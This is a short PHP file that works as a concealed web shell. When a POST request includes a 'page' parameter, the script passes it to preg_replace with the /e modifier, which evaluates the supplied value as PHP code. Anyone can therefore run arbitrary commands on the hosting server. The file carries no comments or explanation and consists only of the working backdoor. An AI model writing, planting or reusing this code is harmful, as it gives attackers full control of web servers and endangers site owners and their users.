<?php
if(isset($_POST['page'])) {
	$page = $_POST[page];
	preg_replace("/[errorpage]/e",$page,"saft");
	exit;
}
?>